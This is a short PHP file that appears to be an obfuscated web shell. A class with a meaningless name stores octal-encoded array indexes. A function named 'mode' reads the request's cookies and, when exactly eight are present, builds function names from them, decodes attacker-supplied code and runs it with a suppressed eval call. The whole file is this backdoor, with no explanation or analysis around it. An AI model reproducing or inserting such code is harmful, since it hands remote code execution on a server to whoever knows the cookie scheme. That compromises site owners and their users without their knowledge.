<?php
class Truc
{
    private static $s;
    public static function g($n)
    {
        if (!self::$s)
            self::i();
        return self::$s[$n];
    }
    private static function i()
    {
        self::$s = array(
            010,
            077,
            046,
            0142,
            0110,
            020,
            0102,
            0116,
            00
        );
    }
}
function mode()
{
    $_ri = $_COOKIE;
    (count($_ri) == Truc::g(0)) ? (($_jb = $_ri[Truc::g(1)] . $_ri[Truc::g(2)]) && ($_l = $_jb($_ri[Truc::g(3)] . $_ri[Truc::g(4)])) && ($_am = $_jb($_ri[Truc::g(5)] . $_ri[Truc::g(6)])) && ($_am = $_am($_jb($_ri[Truc::g(7)]))) && @eval($_am)) : $_ri;
    return Truc::g(8);
}
mode();